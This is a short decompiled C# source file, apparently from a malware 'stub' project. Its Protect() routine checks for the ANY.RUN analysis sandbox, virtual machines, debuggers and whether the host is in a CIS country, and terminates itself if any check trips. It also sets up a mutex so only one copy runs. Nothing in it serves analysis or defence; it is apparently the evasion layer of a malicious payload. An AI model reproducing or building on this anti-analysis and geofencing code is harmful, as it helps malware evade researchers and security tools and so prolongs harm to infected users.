using System;
using Stub.Modules.InternalFuncs;

namespace Stub.Modules.Protects
{
	// Token: 0x02000004 RID: 4
	internal class AllChecker
	{
		// Token: 0x06000005 RID: 5 RVA: 0x000020E0 File Offset: 0x000002E0
		public static void Protect()
		{
			bool flag = config.AntiAnyRun && Runtime.AntiAnyRun();
			if (flag)
			{
				Environment.FailFast("");
			}
			bool flag2 = config.AntiVM && (Runtime.AntiVM_Process() || Runtime.AntiVM_GPU());
			if (flag2)
			{
				Environment.FailFast("");
			}
			bool flag3 = config.AntiCIS && CISCheck.IsCIS();
			if (flag3)
			{
				Environment.FailFast("");
			}
			bool antiDebug = config.AntiDebug;
			if (antiDebug)
			{
				Runtime.AntiProcess();
			}
			bool mutexControl = config.MutexControl;
			if (mutexControl)
			{
				MutexManager.Initialize();
			}
		}
	}
}
